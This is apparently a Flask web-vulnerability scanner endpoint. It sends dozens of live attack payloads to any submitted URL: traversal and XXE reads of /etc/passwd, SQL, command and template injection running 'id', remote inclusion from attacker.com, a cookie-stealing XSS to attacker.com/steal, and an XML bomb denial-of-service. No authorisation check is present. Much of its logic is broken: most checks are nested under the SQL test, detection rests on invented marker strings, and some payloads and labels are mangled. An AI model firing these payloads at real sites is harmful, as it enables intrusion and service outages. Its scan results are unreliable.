import requests
from flask import Blueprint, request,jsonify

vulnurabilities = Blueprint("vulnurability", __name__)
# Define the URL of the website you want to test
@vulnurabilities.route("/check_url/", methods=['POST'])
def vul():
    url = request.json['url']
    vulnurability = []

    try:
       # Check for directory traversal vulnerability
        response = requests.get(url + "../../../../etc/passwd")
        if response.status_code == 200:
            vulnurability.append({
                "title": "Directory Traversal Vulnerability Detected!",
                "explanation": "It is possible to access restricted directories and files on the server."
            })

        # Check for SQL injection vulnerability
        payload = "1' OR '1'='1"
        response = requests.get(url + "/products?id=" + payload)
        if "error" in response.text:
            vulnurability.append({
                "title": "SQL Injection Vulnerability Detected!",
                "explanation": "The application's input sanitation is inadequate. A successful SQL injection attack can read sensitive data from the database, modify database data, execute administration operations on the database, and sometimes issue commands to the operating system."
            })

            # # Check for XSS vulnerability
            payload = "<script>alert('XSS')</script>"
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                 vulnurability.append({
                "title": "XSS vulnerability Detected!",
                "explanation": "XSS vulnerabilities occur when attackers inject malicious scripts into web applications, potentially leading to the execution of scripts in users' browsers."
            })

            # # Check for Command Injection vulnerability
            payload = "127.0.0.1; ls"
            response = requests.get(url + "/ping?host=" + payload)
            if "etc" in response.text:
                vulnurability.append({
                "title": "Command Injection vulnerability Detected!",
                "explanation": "Command injection vulnerabilities occur when attackers can inject and execute malicious commands on a server, potentially leading to code execution."
            })

            # # Check for Remote File Inclusion vulnerability
            payload = "http://attacker.com/malicious_script.php"
            response = requests.get(url + "/file?file=" + payload)
            if "Attacker's Content" in response.text:
                vulnurability.append({
                "title": "Remote File Inclusion vulnerability Detected!",
                "explanation": "Remote File Inclusion vulnerabilities occur when attackers can include and execute files from remote servers, potentially leading to code execution or data exposure."
            })

            # # Check for Server-Side Request Forgery (SSRF) vulnerability
            payload = "http://localhost/admin"
            response = requests.get(url + "/fetch?url=" + payload)
            if "Sensitive Admin Page" in response.text:
               vulnurability.append({
                "title": "Server-Side Request Forgery (SSRF) vulnerability Detected!",
                "explanation": "SSRF vulnerabilities occur when attackers manipulate server requests to access internal resources or perform actions on behalf of the server, potentially leading to data exposure or attacks on internal systems."
            })

            # # Check for Unvalidated Redirect vulnerability
            payload = "https://www.attacker.com"
            response = requests.get(url + "/redirect?to=" + payload)
            if "example.com" not in response.url:
                 vulnurability.append({
                "title": "Unvalidated Redirect vulnerability Detected!",
                "explanation": "Unvalidated Redirect vulnerabilities occur when attackers trick users into visiting malicious websites through open redirects, potentially leading to phishing or other attacks"
            })

            # # Check for Cross-Site Request Forgery (CSRF) vulnerability
            response = requests.get(url, cookies={"session_id": "malicious_session"})
            if "Unauthorized Action Performed" in response.text:
                vulnurability.append({
                "title": "Cross-Site Request Forgery (CSRF) Detected!",
                "explanation": " CSRF vulnerabilities occur when attackers trick users into performing actions on a web application without their consent, potentially leading to unauthorized actions."
            })

            # # Check for Remote Code Execution (RCE) vulnerability
            payload = "'; system('id'); //"
            response = requests.get(url + "/command?cmd=" + payload)
            if "uid" in response.text:
               vulnurability.append({
                "title": "Remote Code Execution (RCE)  Detected!",
                "explanation": "RCE vulnerabilities occur when attackers can execute arbitrary code on a server, potentially leading to full server compromise."
            })

            # # Check for Cross-Site Script Inclusion (XSSI) vulnerability
            payload = "https://www.attacker.com/xssi.js"
            response = requests.get(url + "/xssi?file=" + payload)
            if "Sensitive Information" in response.text:
                vulnurability.append({
                "title": "Cross-Site Script Inclusion (XSSI) vulnerability  Detected!",
                "explanation": "XSSI vulnerabilities occur when attackers can include malicious scripts in web applications, potentially leading to data theft or attacks."
            })

            # # Check for File Upload vulnerability
            # # files = {"file": open("malicious_file.php", "rb")}
            # # response = requests.post(url + "/upload", files=files)
            # # if "File Uploaded Successfully" in response.text:
            # #     vulnurability.append("File Upload Vulnerability Detected!")

            # # Check for Insecure Direct Object Reference (IDOR) vulnerability
            response = requests.get(url + "/profile?id=123")
            if "Unauthorized Access" in response.text:
                 vulnurability.append({
                "title": "Insecure Direct Object Reference (IDOR) vulnerability  Detected!",
                "explanation": "IDOR vulnerabilities occur when an attacker can access objects or data they are not authorized to access, potentially leading to unauthorized access to sensitive information."
            })

            # # Check for XML External Entity (XXE) vulnerability
            payload = "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
            response = requests.post(url, data=payload)
            if "root:x" in response.text:
                 vulnurability.append({
                "title": "XML External Entity (XXE) vulnerability  Detected!",
                "explanation": "XXE vulnerabilities allow attackers to exploit XML parsers and potentially access internal files or execute remote requests."
            })

            # # Check for Server-Side Template Injection (SSTI) vulnerability
            payload = "{{7*'7'}}"
            response = requests.post(url, data={"template": payload})
            if "49" in response.text:
                vulnurability.append({
                "title": "Server-Side Template Injection (SSTI) vulnerability  Detected!",
                "explanation": "SSTI vulnerabilities occur when an attacker can inject malicious code into templates, leading to code execution and potentially server compromise."
            })

            # # Check for Remote Code Inclusion (RCI) vulnerability
            payload = "https://attacker.com/malicious_script.php"
            response = requests.get(url + "?file=" + payload)
            if "Attacker's Code Executed" in response.text:
               vulnurability.append({
                "title": "Remote Code Inclusion (RCI) vulnerability  Detected!",
                "explanation": "RCI vulnerabilities allow attackers to include and execute remote code, potentially leading to code execution and server compromise."
            })

            # # Check for Server-Side Template Injection (SSTI) vulnerability (for specific templating engines like Jinja2)
            payload = "{{ ''.class.__mro[1].__subclasses()[80]('id') }}"
            response = requests.post(url, data={"template": payload})
            if "uid" in response.text:
                vulnurability.append({
                "title": "Server-Side Template Injection (SSTI) vulnerability   Detected!",
                "explanation": "SSTI vulnerabilities specific to certain templating engines (e.g., Jinja2) occur when an attacker can inject malicious code into templates, leading to code execution."
            })

            # # Check for Insecure Deserialization vulnerability
            payload = {"data": "H4sIAAAAAAAA//NIzcnJVyjPL8pJUQQAAP//"}
            response = requests.post(url, data=payload)
            if "Command Executed Successfully" in response.text:
                 vulnurability.append({
                "title": "Insecure Deserialization vulnerability  Detected!",
                "explanation": " Insecure deserialization vulnerabilities occur when attackers can exploit deserialization of data objects, potentially leading to code execution."
            })

            # # Check for Server-Side Request Forgery (SSRF) via DNS rebinding vulnerability
            payload = "http://internal-server.local"
            response = requests.get(url + "/api?endpoint=" + payload)
            if "Internal Resource Contents" in response.text:
                vulnurability.append({
                "title": "Server-Side Request Forgery (SSRF) via DNS rebinding vulnerability Detected!",
                "explanation": "SSRF via DNS rebinding vulnerabilities occur when attackers use DNS manipulation to make the server access internal resources."
            })

            # # Check for Clickjacking vulnerability
            response = requests.get(url)
            if "DENY" not in response.headers.get("X-Frame-Options", ""):
                 vulnurability.append({
                "title": "Clickjacking vulnerability  Detected!",
                "explanation": "Clickjacking vulnerabilities occur when an attacker tricks users into interacting with hidden malicious elements, potentially leading to unauthorized actions."
            })

            # # Check for Security Misconfiguration
            response = requests.get(url + "/admin")
            if response.status_code == 200 and "Default Credentials" in response.text:
                 vulnurability.append({
                "title": "Security Misconfiguration Detected!",
                "explanation": "Security misconfiguration vulnerabilities result from improperly configured security settings, allowing unauthorized access to resources or sensitive information."
            })

            # # Check for Cross-Site Scripting (XSS) via DOM-based vulnerability
            payload = "<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>"
            response = requests.post(url, data={"input": payload})
            if "Attacker's Domain" in response.text:
                 vulnurability.append({
                "title": "Cross-Site Scripting (XSS) via DOM-based vulnerability Detected!",
                "explanation": "DOM-based XSS vulnerabilities occur when an attacker injects malicious code that is executed by manipulating the Document Object Model (DOM) in the victim's browser."
            })

            # # Check for Open Redirect vulnerability
            payload = "https://www.attacker.com"
            response = requests.get(url + "?redirect=" + payload)
            if "example.com" not in response.url:
                 vulnurability.append({
                "title": "Open Redirect vulnerability  Detected!",
                "explanation": "Open redirect vulnerabilities occur when attackers trick users into visiting a malicious site through a data: URL, potentially leading to phishing or other attacks."
            })

            # # Check for Cross-Origin Resource Sharing (CORS) misconfiguration
            response = requests.get(url)
            if response.headers.get("Access-Control-Allow-Origin", "") == "*":
                vulnurability.append("Cross-Origin Resource Sharing (CORS) Misconfiguration Detected!")

          

            # # Check for Server-Side Request Forgery (SSRF) via Server-Side Template Injection (SSTI)
            payload = "{{config.class.__init.__globals['os'].popen('id').read()}}"
            response = requests.post(url, data={"template": payload})
            if "uid" in response.text:
                 vulnurability.append({
                "title": "Server-Side Request Forgery (SSRF) via Server-Side Template Injection (SSTI) Detected!",
                "explanation": "SSRF via SSTI vulnerabilities occur when an attacker uses template injection to trigger SSRF attacks, potentially accessing internal resources."
            })

          

            # # Check for Cross-Site Script Inclusion (XSSI) via JSONP
            payload = "<script src='https://attacker.com/xssi.js'></script>"
            response = requests.get(url + "/data?callback=" + payload)
            if "Sensitive Information" in response.text:
                vulnurability.append({
                "title": "Cross-Site Script Inclusion (XSSI) via JSONP Detected!",
                "explanation": "XSSI via JSONP vulnerabilities allow attackers to include malicious scripts through JSONP requests, potentially leading to data theft and attacks."
            })

            # # Check for Server-Side Denial of Service (DoS) via XML Bomb
            payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE bomb [<!ENTITY a "&#x26;#x41;"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;"><!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;"><!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;"><!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;"><!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;"><!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY n "&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;"><!ENTITY o "&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;"><!ENTITY p "&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;"><!ENTITY q "&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;"><!ENTITY r "&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;"><!ENTITY s "&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;"><!ENTITY t "&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;"><!ENTITY u "&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;"><!ENTITY v "&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;"><!ENTITY w "&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;"><!ENTITY x "&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;"><!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"><!ENTITY z "&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;">]><root>&z;</root>'
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                vulnurability.append({
                "title": "Server-Side Denial of Service (DoS) via XML Bomb Vulnerability Detected!",
                "explanation": "Server-Side DoS via XML bomb vulnerabilities allow attackers to craft XML data that overwhelms server resources and causes a denial of service."
            })

            # # Check for Security Headers Misconfiguration
            response = requests.get(url)
            if "Content-Security-Policy" not in response.headers:
                 vulnurability.append({
                "title": "Security Headers Misconfiguration  Detected!",
                "explanation": "Security headers misconfiguration vulnerabilities result from improperly configured security headers, potentially exposing web applications to various threats."
            })

            # # Check for Cross-Site Request Forgery (CSRF) via Flash
            payload = '''
            <!DOCTYPE html>
            <html>
            <body>
                <h1>CSRF via Flash</h1>
                <object data="https://attacker.com/flash.swf"></object>
            </body>
            </html>
            '''
            response = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if "Unauthorized Action Performed" in response.text:
                 vulnurability.append({
                "title": "Cross-Site Request Forgery (CSRF) via Flash  Detected!",
                "explanation": "CSRF via Flash vulnerabilities occur when attackers use Flash content to trick users into performing unauthorized actions on web applications."
            })

            # # Check for Server-Side Template Injection (SSTI) via Twig
            payload = "{{7*'7'}}"
            response = requests.post(url, data={"template": payload})
            if "49" in response.text:
                 vulnurability.append({
                "title": "Server-Side Template Injection (SSTI) via Twig  Detected!",
                "explanation": "SSTI via Twig vulnerabilities occur when attackers can inject malicious code into Twig templates, leading to code execution."
            })

            # # Check for Cross-Site Scripting (XSS) via SVG
            payload = '''
            <svg xmlns="http://www.w3.org/2000/svg">
            <script>alert('XSS')</script>
            </svg>
            '''
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                 vulnurability.append({
                "title": "Cross-Site Scripting (XSS) via SVG Detected!",
                "explanation": "RCI vulnerabilities allow attackers to include and execute remote code, potentially leading to code execution and server compromise."
            })

            # # Check for Server-Side Request Forgery (SSRF) via XXE
            payload = '''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://internal-server.local"> %remote;]>
            <root></root>
            '''
            response = requests.post(url, data=payload)
            if "Internal Resource Contents" in response.text:
                vulnurability.append({
                "title": "Server-Side Request Forgery (SSRF) via XXE Detected!",
                "explanation": "SSRF via XXE vulnerabilities occur when attackers exploit XML External Entity (XXE) vulnerabilities to trigger SSRF attacks, potentially accessing internal resources."
            })

            # # Check for Open Redirect vulnerability via data: URL
            payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRUUCBXSVRIIFJFUE9SVCcpPC9zY3JpcHQ+"
            response = requests.get(url + "?redirect=" + payload)
            if "example.com" not in response.url:
                 vulnurability.append({
                "title": "Open Redirect vulnerability via data: URL  Detected!",
                "explanation": "Open redirect vulnerabilities occur when attackers trick users into visiting a malicious site through a data: URL, potentially leading to phishing or other attacks."
            })

        
            # # Check for Insecure Deserialization vulnerability
            payload = "gAN9cQBYAQAAAGV4ZWN1dGlvbl90aW1lcXVhbGl0eQFyBAAAAHRpbWVvdXQKWAUAAABleGVjdXRpb25faWQKcQFXAQAAAGlkcQJYBAAAAGFjdGl2ZV9pZApxAkcBAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQ1SAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFhSgAAAHZhbHVlCnEKSgMAAAByZWxlYXNlCnEKVgUAAABpZApxCUQCAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQhLAwAAAHN0cmluZ19mcm9udF90aW1lCnEKYUsCAAAAdmFsdWUKcQpSAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFRawAAAA=="
            response = requests.post(url, data=payload)
            if "Insecure Deserialization Detected!" in response.text:
                 vulnurability.append({
                "title": "Insecure Deserialization vulnerability  Detected!",
                "explanation": "Insecure deserialization vulnerabilities occur when attackers can exploit deserialization of data objects, potentially leading to code execution."
            })
  
    except Exception as e:
        vulnurability.append("An error occurred: " + str(e))

    return jsonify(vulnurability),200